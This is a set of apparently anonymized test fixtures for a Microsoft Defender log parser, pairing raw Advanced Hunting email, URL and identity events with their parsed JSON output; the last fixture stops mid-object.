=== "test_email_delivered2.json"

    ```json
	
    {
        "message": "{\"time\":\"2024-10-28T14:39:28.9769628Z\",\"tenantId\":\"22222222-2222-2222-2222-222222222222\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-EmailEvents\",\"_TimeReceivedBySvc\":\"2024-10-28T14:18:38.5006358Z\",\"properties\":{\"ReportId\":\"22222222-2222-2222-2222-222222222222-abcdef1234567890ab-c\",\"NetworkMessageId\":\"11111111-1111-1111-1111-111111111111\",\"InternetMessageId\":\"ANONYMIZED\",\"Timestamp\":\"2024-10-28T14:18:38Z\",\"EmailClusterId\":2633942188,\"SenderIPv4\":\"1.1.1.1\",\"SenderIPv6\":null,\"SenderMailFromAddress\":\"john.doe@test.fr\",\"SenderFromAddress\":\"john.doe@test.fr\",\"SenderMailFromDomain\":\"test.fr\",\"SenderFromDomain\":\"test.fr\",\"RecipientEmailAddress\":\"ANONYMIZED\",\"Subject\":\"ANONYMIZED\",\"EmailDirection\":\"Inbound\",\"DeliveryAction\":\"Delivered\",\"DeliveryLocation\":\"Inbox/folder\",\"EmailAction\":null,\"EmailActionPolicy\":null,\"EmailActionPolicyGuid\":null,\"AttachmentCount\":0,\"UrlCount\":0,\"EmailLanguage\":\"en\",\"RecipientObjectId\":\"ANONYMIZED\",\"SenderObjectId\":null,\"SenderDisplayName\":null,\"ThreatNames\":null,\"ThreatTypes\":null,\"DetectionMethods\":null,\"Connectors\":\"Relai SMTP interne\",\"OrgLevelAction\":\"Allow\",\"OrgLevelPolicy\":\"Connection policy\",\"UserLevelAction\":null,\"UserLevelPolicy\":null,\"ConfidenceLevel\":null,\"AdditionalFields\":null,\"AuthenticationDetails\":\"{\\\"SPF\\\":\\\"pass\\\",\\\"DKIM\\\":\\\"none\\\",\\\"DMARC\\\":\\\"pass\\\"}\",\"BulkComplaintLevel\":null},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "action": "Delivered",
            "category": [
                "connection",
                "email"
            ],
            "dataset": "email_events",
            "type": [
                "allowed",
                "info"
            ]
        },
        "@timestamp": "2024-10-28T14:18:38Z",
        "action": {
            "name": "Publish",
            "properties": {
                "AttachmentCount": 0,
                "AuthenticationDetails": "{\"DKIM\":\"none\",\"DMARC\":\"pass\",\"SPF\":\"pass\"}",
                "Connectors": "Relai SMTP interne",
                "DeliveryAction": "Delivered",
                "DeliveryLocation": "Inbox/folder",
                "EmailClusterId": "2633942188",
                "EmailDirection": "Inbound",
                "EmailLanguage": "en",
                "OrgLevelAction": "Allow",
                "OrgLevelPolicy": "Connection policy",
                "RecipientObjectId": "ANONYMIZED",
                "SenderFromDomain": "test.fr",
                "UrlCount": 0
            }
        },
        "email": {
            "direction": "inbound",
            "from": {
                "address": [
                    "john.doe@test.fr"
                ]
            },
            "local_id": "11111111-1111-1111-1111-111111111111",
            "message_id": "ANONYMIZED",
            "subject": "ANONYMIZED",
            "to": {
                "address": [
                    "ANONYMIZED"
                ]
            }
        },
        "microsoft": {
            "defender": {
                "email_auth": {
                    "DKIM": "none",
                    "DMARC": "pass",
                    "SPF": "pass"
                },
                "report": {
                    "id": "22222222-2222-2222-2222-222222222222-abcdef1234567890ab-c"
                }
            }
        },
        "related": {
            "ip": [
                "1.1.1.1"
            ]
        },
        "source": {
            "address": "1.1.1.1",
            "ip": "1.1.1.1"
        }
    }
    	
	```


=== "test_email_events.json"

    ```json
	
    {
        "message": "{\"time\":\"2022-09-01T07:28:59.5127177Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-EmailEvents\",\"properties\":{\"AccountSid\":null,\"AccountDomain\":null,\"AccountName\":null,\"LogonId\":null,\"FileName\":null,\"FolderPath\":null,\"MD5\":null,\"SHA1\":null,\"FileSize\":null,\"SHA256\":null,\"ProcessCreationTime\":null,\"ProcessTokenElevation\":null,\"RemoteUrl\":null,\"RegistryKey\":null,\"RegistryValueName\":null,\"RegistryValueData\":null,\"RemoteDeviceName\":null,\"FileOriginIP\":null,\"FileOriginUrl\":null,\"LocalIP\":\"1.1.1.1\",\"LocalPort\":null,\"RemoteIP\":\"2.2.2.2\",\"RemotePort\":null,\"ProcessId\":null,\"ProcessCommandLine\":null,\"AdditionalFields\":\"{\\\"BaseAddress\\\":2098738167808,\\\"RegionSize\\\":262144,\\\"ProtectionMask\\\":64}\",\"ActionType\":\"NtAllocateVirtualMemoryApiCall\",\"InitiatingProcessVersionInfoCompanyName\":\"Google\",\"InitiatingProcessVersionInfoProductName\":\"Software Reporter Tool\",\"InitiatingProcessVersionInfoProductVersion\":\"102.286.200\",\"InitiatingProcessVersionInfoInternalFileName\":\"software_reporter_tool_exe\",\"InitiatingProcessVersionInfoOriginalFileName\":\"software_reporter_tool.exe\",\"InitiatingProcessVersionInfoFileDescription\":\"Software Reporter Tool\",\"InitiatingProcessFolderPath\":\"c:\\\\users\\\\USER\\\\appdata\\\\local\\\\google\\\\chrome\\\\user data\\\\swreporter\\\\102.286.200\\\\software_reporter_tool.exe\",\"InitiatingProcessFileName\":\"software_reporter_tool.exe\",\"InitiatingProcessFileSize\":14687048,\"InitiatingProcessMD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"InitiatingProcessSHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"InitiatingProcessSHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"InitiatingProcessLogonId\":121834210,\"InitiatingProcessAccountSid\":\"user1\",\"InitiatingProcessAccountDomain\":\"example.com\",\"InitiatingProcessAccountName\":\"user1\",\"InitiatingProcessAccountUpn\":\"user@example.org\",\"InitiatingProcessAccountObjectId\":\"22222222-2222-2222-2222-222222222222\",\"InitiatingProcessCreationTime\":\"2022-09-01T06:56:23.7887846Z\",\"InitiatingProcessId\":1664,\"InitiatingProcessCommandLine\":\"\\\"software_reporter_tool.exe\\\" --use-crash-handler-with-id=\\\"\\\\\\\\.\\\\pipe\\\\crashpad_11111_XXXXXXXXXXXXXXXX\\\" --sandboxed-process-id=2 --init-done-notifier=804 --sandbox-mojo-pipe-token=********** --mojo-platform-channel-handle=780 --engine=2\",\"InitiatingProcessParentCreationTime\":\"2022-09-01T06:56:23.595229Z\",\"InitiatingProcessParentId\":15532,\"InitiatingProcessParentFileName\":\"software_reporter_tool.exe\",\"DeviceId\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"AppGuardContainerId\":\"\",\"MachineGroup\":\"UnassignedGroup\",\"Timestamp\":\"2022-09-01T07:09:47.4980566Z\",\"DeviceName\":\"example.com\",\"ReportId\":104061}}",
        "event": {
            "category": [
                "email"
            ],
            "dataset": "email_events",
            "type": [
                "denied",
                "info"
            ]
        },
        "@timestamp": "2022-09-01T07:09:47.498056Z",
        "action": {
            "name": "Publish",
            "properties": {
                "InitiatingProcessAccountObjectId": "22222222-2222-2222-2222-222222222222",
                "InitiatingProcessCommandLine": "\"software_reporter_tool.exe\" --use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_11111_XXXXXXXXXXXXXXXX\" --sandboxed-process-id=2 --init-done-notifier=804 --sandbox-mojo-pipe-token=********** --mojo-platform-channel-handle=780 --engine=2",
                "InitiatingProcessFileSize": 14687048,
                "InitiatingProcessLogonId": "121834210",
                "InitiatingProcessVersionInfoCompanyName": "Google",
                "InitiatingProcessVersionInfoFileDescription": "Software Reporter Tool",
                "InitiatingProcessVersionInfoInternalFileName": "software_reporter_tool_exe",
                "InitiatingProcessVersionInfoOriginalFileName": "software_reporter_tool.exe",
                "InitiatingProcessVersionInfoProductName": "Software Reporter Tool",
                "InitiatingProcessVersionInfoProductVersion": "102.286.200"
            },
            "type": "NtAllocateVirtualMemoryApiCall"
        },
        "agent": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
        },
        "destination": {
            "address": "2.2.2.2",
            "ip": "2.2.2.2"
        },
        "host": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "104061"
                }
            }
        },
        "process": {
            "args": [
                "--engine=2",
                "--init-done-notifier=804",
                "--mojo-platform-channel-handle=780",
                "--sandbox-mojo-pipe-token=**********",
                "--sandboxed-process-id=2",
                "--use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_11111_XXXXXXXXXXXXXXXX\""
            ],
            "command_line": "\"software_reporter_tool.exe\" --use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_11111_XXXXXXXXXXXXXXXX\" --sandboxed-process-id=2 --init-done-notifier=804 --sandbox-mojo-pipe-token=********** --mojo-platform-channel-handle=780 --engine=2",
            "executable": "c:\\users\\USER\\appdata\\local\\google\\chrome\\user data\\swreporter\\102.286.200\\software_reporter_tool.exe",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "software_reporter_tool.exe",
            "parent": {
                "name": "software_reporter_tool.exe",
                "pid": 15532,
                "start": "2022-09-01T06:56:23.595229Z"
            },
            "pid": 1664,
            "start": "2022-09-01T06:56:23.788784Z",
            "user": {
                "domain": "example.com",
                "email": "user@example.org",
                "id": "user1",
                "name": "user1"
            },
            "working_directory": "c:\\users\\USER\\appdata\\local\\google\\chrome\\user data\\swreporter\\102.286.200"
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
                "68b329da9893e34099c7d8ad5cb9c940",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ],
            "ip": [
                "1.1.1.1",
                "2.2.2.2"
            ]
        },
        "source": {
            "address": "1.1.1.1",
            "ip": "1.1.1.1"
        }
    }
    	
	```


=== "test_email_post_delivery.json"

    ```json
	
    {
        "message": "{\"time\":\"2024-10-03T11:12:21.6209320Z\",\"tenantId\":\"22222222-2222-2222-2222-222222222222\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-EmailPostDeliveryEvents\",\"_TimeReceivedBySvc\":\"2024-10-03T11:11:32.8258142Z\",\"properties\":{\"ReportId\":\"11111111-1111-1111-1111-111111111111-10422652723071570813\",\"NetworkMessageId\":\"11111111-1111-1111-1111-111111111111\",\"RecipientEmailAddress\":\"john.doe@example.com\",\"Timestamp\":\"2024-10-03T11:11:32Z\",\"ActionType\":\"Spam ZAP\",\"ActionResult\":\"Success\",\"Action\":\"Moved to quarantine\",\"DeliveryLocation\":\"Quarantine\",\"ActionTrigger\":\"SpecialAction\",\"InternetMessageId\":\"ANONYMIZED\",\"ThreatTypes\":\"Spam\",\"DetectionMethods\":\"{\\\"Spam\\\":[\\\"Fingerprint matching\\\"]}\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "action": "Moved to quarantine",
            "category": [
                "email"
            ],
            "dataset": "email_post_delivery_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2024-10-03T11:11:32Z",
        "action": {
            "name": "Publish",
            "properties": {
                "ActionResult": "Success",
                "ActionTrigger": "SpecialAction",
                "DeliveryLocation": "Quarantine"
            },
            "type": "Spam ZAP"
        },
        "email": {
            "local_id": "11111111-1111-1111-1111-111111111111",
            "message_id": "ANONYMIZED",
            "to": {
                "address": [
                    "john.doe@example.com"
                ]
            }
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "11111111-1111-1111-1111-111111111111-10422652723071570813"
                },
                "threat": {
                    "detection": "{\"Spam\":[\"Fingerprint matching\"]}",
                    "types": "Spam"
                }
            }
        }
    }
    	
	```


=== "test_email_url_info.json"

    ```json
	
    {
        "message": "{\"time\":\"2022-09-01T07:28:59.5127177Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-EmailUrlInfo\",\"properties\":{\"AccountSid\":null,\"AccountDomain\":null,\"AccountName\":null,\"LogonId\":null,\"FileName\":null,\"FolderPath\":null,\"MD5\":null,\"SHA1\":null,\"FileSize\":null,\"SHA256\":null,\"ProcessCreationTime\":null,\"ProcessTokenElevation\":null,\"RemoteUrl\":null,\"RegistryKey\":null,\"RegistryValueName\":null,\"RegistryValueData\":null,\"RemoteDeviceName\":null,\"FileOriginIP\":null,\"FileOriginUrl\":null,\"LocalIP\":\"1.1.1.1\",\"LocalPort\":null,\"RemoteIP\":\"2.2.2.2\",\"RemotePort\":null,\"ProcessId\":null,\"ProcessCommandLine\":null,\"AdditionalFields\":\"{\\\"BaseAddress\\\":2098738167808,\\\"RegionSize\\\":262144,\\\"ProtectionMask\\\":64}\",\"ActionType\":\"NtAllocateVirtualMemoryApiCall\",\"InitiatingProcessVersionInfoCompanyName\":\"Google\",\"InitiatingProcessVersionInfoProductName\":\"Software Reporter Tool\",\"InitiatingProcessVersionInfoProductVersion\":\"102.286.200\",\"InitiatingProcessVersionInfoInternalFileName\":\"software_reporter_tool_exe\",\"InitiatingProcessVersionInfoOriginalFileName\":\"software_reporter_tool.exe\",\"InitiatingProcessVersionInfoFileDescription\":\"Software Reporter Tool\",\"InitiatingProcessFolderPath\":\"c:\\\\users\\\\USER\\\\appdata\\\\local\\\\google\\\\chrome\\\\user data\\\\swreporter\\\\102.286.200\\\\software_reporter_tool.exe\",\"InitiatingProcessFileName\":\"software_reporter_tool.exe\",\"InitiatingProcessFileSize\":14687048,\"InitiatingProcessMD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"InitiatingProcessSHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"InitiatingProcessSHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"InitiatingProcessLogonId\":121834210,\"InitiatingProcessAccountSid\":\"user1\",\"InitiatingProcessAccountDomain\":\"example.com\",\"InitiatingProcessAccountName\":\"user1\",\"InitiatingProcessAccountUpn\":\"user@example.org\",\"InitiatingProcessAccountObjectId\":\"22222222-2222-2222-2222-222222222222\",\"InitiatingProcessCreationTime\":\"2022-09-01T06:56:23.7887846Z\",\"InitiatingProcessId\":1664,\"InitiatingProcessCommandLine\":\"\\\"software_reporter_tool.exe\\\" --use-crash-handler-with-id=\\\"\\\\\\\\.\\\\pipe\\\\crashpad_11111_XXXXXXXXXXXXXXXX\\\" --sandboxed-process-id=2 --init-done-notifier=804 --sandbox-mojo-pipe-token=********** --mojo-platform-channel-handle=780 --engine=2\",\"InitiatingProcessParentCreationTime\":\"2022-09-01T06:56:23.595229Z\",\"InitiatingProcessParentId\":15532,\"InitiatingProcessParentFileName\":\"software_reporter_tool.exe\",\"DeviceId\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"AppGuardContainerId\":\"\",\"MachineGroup\":\"UnassignedGroup\",\"Timestamp\":\"2022-09-01T07:09:47.4980566Z\",\"DeviceName\":\"example.com\",\"ReportId\":104061}}",
        "event": {
            "category": [
                "email"
            ],
            "dataset": "email_url_info",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2022-09-01T07:09:47.498056Z",
        "action": {
            "name": "Publish",
            "properties": {
                "InitiatingProcessAccountObjectId": "22222222-2222-2222-2222-222222222222",
                "InitiatingProcessCommandLine": "\"software_reporter_tool.exe\" --use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_11111_XXXXXXXXXXXXXXXX\" --sandboxed-process-id=2 --init-done-notifier=804 --sandbox-mojo-pipe-token=********** --mojo-platform-channel-handle=780 --engine=2",
                "InitiatingProcessFileSize": 14687048,
                "InitiatingProcessLogonId": "121834210",
                "InitiatingProcessVersionInfoCompanyName": "Google",
                "InitiatingProcessVersionInfoFileDescription": "Software Reporter Tool",
                "InitiatingProcessVersionInfoInternalFileName": "software_reporter_tool_exe",
                "InitiatingProcessVersionInfoOriginalFileName": "software_reporter_tool.exe",
                "InitiatingProcessVersionInfoProductName": "Software Reporter Tool",
                "InitiatingProcessVersionInfoProductVersion": "102.286.200"
            },
            "type": "NtAllocateVirtualMemoryApiCall"
        },
        "agent": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
        },
        "destination": {
            "address": "2.2.2.2",
            "ip": "2.2.2.2"
        },
        "host": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "104061"
                }
            }
        },
        "process": {
            "args": [
                "--engine=2",
                "--init-done-notifier=804",
                "--mojo-platform-channel-handle=780",
                "--sandbox-mojo-pipe-token=**********",
                "--sandboxed-process-id=2",
                "--use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_11111_XXXXXXXXXXXXXXXX\""
            ],
            "command_line": "\"software_reporter_tool.exe\" --use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_11111_XXXXXXXXXXXXXXXX\" --sandboxed-process-id=2 --init-done-notifier=804 --sandbox-mojo-pipe-token=********** --mojo-platform-channel-handle=780 --engine=2",
            "executable": "c:\\users\\USER\\appdata\\local\\google\\chrome\\user data\\swreporter\\102.286.200\\software_reporter_tool.exe",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "software_reporter_tool.exe",
            "parent": {
                "name": "software_reporter_tool.exe",
                "pid": 15532,
                "start": "2022-09-01T06:56:23.595229Z"
            },
            "pid": 1664,
            "start": "2022-09-01T06:56:23.788784Z",
            "user": {
                "domain": "example.com",
                "email": "user@example.org",
                "id": "user1",
                "name": "user1"
            },
            "working_directory": "c:\\users\\USER\\appdata\\local\\google\\chrome\\user data\\swreporter\\102.286.200"
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
                "68b329da9893e34099c7d8ad5cb9c940",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ],
            "ip": [
                "1.1.1.1",
                "2.2.2.2"
            ]
        },
        "source": {
            "address": "1.1.1.1",
            "ip": "1.1.1.1"
        }
    }
    	
	```


=== "test_email_url_info_2.json"

    ```json
	
    {
        "message": "{\"time\":\"2024-10-04T16:36:20.6444402Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-EmailUrlInfo\",\"_TimeReceivedBySvc\":\"2024-10-04T16:35:56.4645301Z\",\"properties\":{\"ReportId\":\"22222222-2222-2222-2222-222222222222-4376657523182014843\",\"NetworkMessageId\":\"22222222-2222-2222-2222-222222222222\",\"Timestamp\":\"2024-10-04T16:35:56Z\",\"Url\":\"https://example.com/index.php?q=some+stuff\",\"UrlDomain\":\"example.com\",\"UrlLocation\":\"Body\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "email"
            ],
            "dataset": "email_url_info",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2024-10-04T16:35:56Z",
        "action": {
            "name": "Publish"
        },
        "email": {
            "local_id": "22222222-2222-2222-2222-222222222222"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "22222222-2222-2222-2222-222222222222-4376657523182014843"
                },
                "url_location": "Body"
            }
        },
        "related": {
            "hosts": [
                "example.com"
            ]
        },
        "url": {
            "domain": "example.com",
            "full": "https://example.com/index.php?q=some+stuff",
            "original": "https://example.com/index.php?q=some+stuff",
            "path": "/index.php",
            "port": 443,
            "query": "q=some+stuff",
            "registered_domain": "example.com",
            "scheme": "https",
            "top_level_domain": "com"
        }
    }
    	
	```


=== "test_identity_directory.json"

    ```json
	
    {
        "message": "{\"time\":\"2022-09-01T07:28:59.5127177Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-IdentityDirectoryEvents\",\"properties\":{\"AccountSid\":null,\"AccountDomain\":null,\"AccountName\":null,\"LogonId\":null,\"FileName\":null,\"FolderPath\":null,\"MD5\":null,\"SHA1\":null,\"FileSize\":null,\"SHA256\":null,\"ProcessCreationTime\":null,\"ProcessTokenElevation\":null,\"RemoteUrl\":null,\"RegistryKey\":null,\"RegistryValueName\":null,\"RegistryValueData\":null,\"RemoteDeviceName\":null,\"FileOriginIP\":null,\"FileOriginUrl\":null,\"LocalIP\":\"1.1.1.1\",\"LocalPort\":null,\"RemoteIP\":\"2.2.2.2\",\"RemotePort\":null,\"ProcessId\":null,\"ProcessCommandLine\":null,\"AdditionalFields\":\"{\\\"BaseAddress\\\":2098738167808,\\\"RegionSize\\\":262144,\\\"ProtectionMask\\\":64}\",\"ActionType\":\"NtAllocateVirtualMemoryApiCall\",\"InitiatingProcessVersionInfoCompanyName\":\"Google\",\"InitiatingProcessVersionInfoProductName\":\"Software Reporter Tool\",\"InitiatingProcessVersionInfoProductVersion\":\"102.286.200\",\"InitiatingProcessVersionInfoInternalFileName\":\"software_reporter_tool_exe\",\"InitiatingProcessVersionInfoOriginalFileName\":\"software_reporter_tool.exe\",\"InitiatingProcessVersionInfoFileDescription\":\"Software Reporter Tool\",\"InitiatingProcessFolderPath\":\"c:\\\\users\\\\USER\\\\appdata\\\\local\\\\google\\\\chrome\\\\user data\\\\swreporter\\\\102.286.200\\\\software_reporter_tool.exe\",\"InitiatingProcessFileName\":\"software_reporter_tool.exe\",\"InitiatingProcessFileSize\":14687048,\"InitiatingProcessMD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"InitiatingProcessSHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"InitiatingProcessSHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"InitiatingProcessLogonId\":121834210,\"InitiatingProcessAccountSid\":\"user1\",\"InitiatingProcessAccountDomain\":\"example.com\",\"InitiatingProcessAccountName\":\"user1\",\"InitiatingProcessAccountUpn\":\"user@example.org\",\"InitiatingProcessAccountObjectId\":\"22222222-2222-2222-2222-222222222222\",\"InitiatingProcessCreationTime\":\"2022-09-01T06:56:23.7887846Z\",\"InitiatingProcessId\":1664,\"InitiatingProcessCommandLine\":\"\\\"software_reporter_tool.exe\\\" --use-crash-handler-with-id=\\\"\\\\\\\\.\\\\pipe\\\\crashpad_11111_XXXXXXXXXXXXXXXX\\\" --sandboxed-process-id=2 --init-done-notifier=804 --sandbox-mojo-pipe-token=********** --mojo-platform-channel-handle=780 --engine=2\",\"InitiatingProcessParentCreationTime\":\"2022-09-01T06:56:23.595229Z\",\"InitiatingProcessParentId\":15532,\"InitiatingProcessParentFileName\":\"software_reporter_tool.exe\",\"DeviceId\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"AppGuardContainerId\":\"\",\"MachineGroup\":\"UnassignedGroup\",\"Timestamp\":\"2022-09-01T07:09:47.4980566Z\",\"DeviceName\":\"example.com\",\"ReportId\":104061}}",
        "event": {
            "category": [
                "iam"
            ],
            "dataset": "identity_directory_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2022-09-01T07:09:47.498056Z",
        "action": {
            "name": "Publish",
            "properties": {
                "InitiatingProcessAccountObjectId": "22222222-2222-2222-2222-222222222222",
                "InitiatingProcessCommandLine": "\"software_reporter_tool.exe\" --use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_11111_XXXXXXXXXXXXXXXX\" --sandboxed-process-id=2 --init-done-notifier=804 --sandbox-mojo-pipe-token=********** --mojo-platform-channel-handle=780 --engine=2",
                "InitiatingProcessFileSize": 14687048,
                "InitiatingProcessLogonId": "121834210",
                "InitiatingProcessVersionInfoCompanyName": "Google",
                "InitiatingProcessVersionInfoFileDescription": "Software Reporter Tool",
                "InitiatingProcessVersionInfoInternalFileName": "software_reporter_tool_exe",
                "InitiatingProcessVersionInfoOriginalFileName": "software_reporter_tool.exe",
                "InitiatingProcessVersionInfoProductName": "Software Reporter Tool",
                "InitiatingProcessVersionInfoProductVersion": "102.286.200"
            },
            "type": "NtAllocateVirtualMemoryApiCall"
        },
        "agent": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
        },
        "destination": {
            "address": "2.2.2.2",
            "ip": "2.2.2.2"
        },
        "host": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "104061"
                }
            }
        },
        "process": {
            "args": [
                "--engine=2",
                "--init-done-notifier=804",
                "--mojo-platform-channel-handle=780",
                "--sandbox-mojo-pipe-token=**********",
                "--sandboxed-process-id=2",
                "--use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_11111_XXXXXXXXXXXXXXXX\""
            ],
            "command_line": "\"software_reporter_tool.exe\" --use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_11111_XXXXXXXXXXXXXXXX\" --sandboxed-process-id=2 --init-done-notifier=804 --sandbox-mojo-pipe-token=********** --mojo-platform-channel-handle=780 --engine=2",
            "executable": "c:\\users\\USER\\appdata\\local\\google\\chrome\\user data\\swreporter\\102.286.200\\software_reporter_tool.exe",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "software_reporter_tool.exe",
            "parent": {
                "name": "software_reporter_tool.exe",
                "pid": 15532,
                "start": "2022-09-01T06:56:23.595229Z"
            },
            "pid": 1664,
            "start": "2022-09-01T06:56:23.788784Z",
            "user": {
                "domain": "example.com",
                "email": "user@example.org",
                "id": "user1",
                "name": "user1"
            },
            "working_directory": "c:\\users\\USER\\appdata\\local\\google\\chrome\\user data\\swreporter\\102.286.200"
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
                "68b329da9893e34099c7d8ad5cb9c940",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ],
            "ip": [
                "1.1.1.1",
                "2.2.2.2"
            ]
        },
        "source": {
            "address": "1.1.1.1",
            "ip": "1.1.1.1"
        }
    }
    	
	```


=== "test_identity_info.json"

    ```json
	
    {
        "message": "{\"time\":\"2022-09-01T07:28:59.5127177Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-IdentityInfo\",\"properties\":{\"AccountSid\":null,\"AccountDomain\":null,\"AccountName\":null,\"LogonId\":null,\"FileName\":null,\"FolderPath\":null,\"MD5\":null,\"SHA1\":null,\"FileSize\":null,\"SHA256\":null,\"ProcessCreationTime\":null,\"ProcessTokenElevation\":null,\"RemoteUrl\":null,\"RegistryKey\":null,\"RegistryValueName\":null,\"RegistryValueData\":null,\"RemoteDeviceName\":null,\"FileOriginIP\":null,\"FileOriginUrl\":null,\"LocalIP\":\"1.1.1.1\",\"LocalPort\":null,\"RemoteIP\":\"2.2.2.2\",\"RemotePort\":null,\"ProcessId\":null,\"ProcessCommandLine\":null,\"AdditionalFields\":\"{\\\"BaseAddress\\\":2098738167808,\\\"RegionSize\\\":262144,\\\"ProtectionMask\\\":64}\",\"ActionType\":\"NtAllocateVirtualMemoryApiCall\",\"InitiatingProcessVersionInfoCompanyName\":\"Google\",\"InitiatingProcessVersionInfoProductName\":\"Software Reporter Tool\",\"InitiatingProcessVersionInfoProductVersion\":\"102.286.200\",\"InitiatingProcessVersionInfoInternalFileName\":\"software_reporter_tool_exe\",\"InitiatingProcessVersionInfoOriginalFileName\":\"software_reporter_tool.exe\",\"InitiatingProcessVersionInfoFileDescription\":\"Software Reporter Tool\",\"InitiatingProcessFolderPath\":\"c:\\\\users\\\\USER\\\\appdata\\\\local\\\\google\\\\chrome\\\\user data\\\\swreporter\\\\102.286.200\\\\software_reporter_tool.exe\",\"InitiatingProcessFileName\":\"software_reporter_tool.exe\",\"InitiatingProcessFileSize\":14687048,\"InitiatingProcessMD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"InitiatingProcessSHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"InitiatingProcessSHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"InitiatingProcessLogonId\":121834210,\"InitiatingProcessAccountSid\":\"user1\",\"InitiatingProcessAccountDomain\":\"example.com\",\"InitiatingProcessAccountName\":\"user1\",\"InitiatingProcessAccountUpn\":\"user@example.org\",\"InitiatingProcessAccountObjectId\":\"22222222-2222-2222-2222-222222222222\",\"InitiatingProcessCreationTime\":\"2022-09-01T06:56:23.7887846Z\",\"InitiatingProcessId\":1664,\"InitiatingProcessCommandLine\":\"\\\"software_reporter_tool.exe\\\" --use-crash-handler-with-id=\\\"\\\\\\\\.\\\\pipe\\\\crashpad_11111_XXXXXXXXXXXXXXXX\\\" --sandboxed-process-id=2 --init-done-notifier=804 --sandbox-mojo-pipe-token=********** --mojo-platform-channel-handle=780 --engine=2\",\"InitiatingProcessParentCreationTime\":\"2022-09-01T06:56:23.595229Z\",\"InitiatingProcessParentId\":15532,\"InitiatingProcessParentFileName\":\"software_reporter_tool.exe\",\"DeviceId\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"AppGuardContainerId\":\"\",\"MachineGroup\":\"UnassignedGroup\",\"Timestamp\":\"2022-09-01T07:09:47.4980566Z\",\"DeviceName\":\"example.com\",\"ReportId\":104061}}",
        "event": {
            "category": [
                "iam"
            ],
            "dataset": "identity_info",
            "type": [
                "user"
            ]
        },
